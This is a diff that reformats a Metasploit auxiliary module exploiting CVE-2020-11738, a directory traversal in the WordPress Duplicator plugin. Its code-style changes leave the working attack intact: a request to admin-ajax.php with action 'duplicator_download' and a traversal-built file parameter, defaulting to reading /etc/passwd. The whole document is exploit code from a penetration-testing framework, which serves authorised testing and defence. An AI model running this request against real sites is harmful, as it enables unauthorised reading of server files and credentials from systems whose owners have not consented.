@@ -9,33 +9,37 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
-    super(update_info(info,
-                      'Name' => 'WordPress Duplicator File Read Vulnerability',
-                      'Description' => %q{
-        This module exploits an unauthenticated directory traversal vulnerability in WordPress plugin 'Duplicator' plugin version 1.3.24-1.3.26, allowing arbitrary file read with the web server privileges.
-        This vulnerability was being actively exploited when it was discovered.
-      },
-                      'References' =>
-                        [
-                          ['CVE', '2020-11738'],
-                          ['WPVDB', '10078'],
-                          ['URL', 'https://snapcreek.com/duplicator/docs/changelog']
-                        ],
-                      'Author' =>
-                        [
-                          'Ramuel Gall', # Vulnerability discovery
-                          'Hoa Nguyen - SunCSR Team' # Metasploit module
-                        ],
-                      'DisclosureDate' => 'Feb 19 2020',
-                      'License' => MSF_LICENSE
-
-          ))
+    super(
+      update_info(
+        info,
+        'Name' => 'WordPress Duplicator File Read Vulnerability',
+        'Description' => %q{
+          This module exploits an unauthenticated directory traversal vulnerability in WordPress plugin
+          'Duplicator' version 1.3.24-1.3.26, allowing arbitrary file read with the web server privileges.
+          This vulnerability was being actively exploited when it was discovered.
+        },
+        'References' =>
+          [
+            ['CVE', '2020-11738'],
+            ['WPVDB', '10078'],
+            ['URL', 'https://snapcreek.com/duplicator/docs/changelog']
+          ],
+        'Author' =>
+          [
+            'Ramuel Gall', # Vulnerability discovery
+            'Hoa Nguyen - SunCSR Team' # Metasploit module
+          ],
+        'DisclosureDate' => '2020-02-19',
+        'License' => MSF_LICENSE
+      )
+    )
 
     register_options(
       [
         OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),
         OptInt.new('DEPTH', [true, 'Traversal Depth (to reach the root folder)', 5])
-      ])
+      ]
+    )
   end
 
   def check
@@ -45,17 +49,17 @@ class MetasploitModule < Msf::Auxiliary
   def run_host(ip)
     traversal = '../' * datastore['DEPTH']
     filename = datastore['FILEPATH']
-    filename = filename[1, filename.length] if filename =~ /^\//
+    filename = filename[1, filename.length] if filename =~ %r{^/}
 
     res = send_request_cgi({
-                             'method' => 'GET',
-                             'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),
-                             'vars_get' =>
-                               {
-                                 'action' => 'duplicator_download',
-                                 'file' => "#{traversal}#{filename}"
-                               }
-                           })
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),
+      'vars_get' =>
+                    {
+                      'action' => 'duplicator_download',
+                      'file' => "#{traversal}#{filename}"
+                    }
+    })
 
     fail_with Failure::Unreachable, 'Connection failed' unless res
     fail_with Failure::NotVulnerable, 'Connection failed. Nothing was downloaded' if res.code != 200
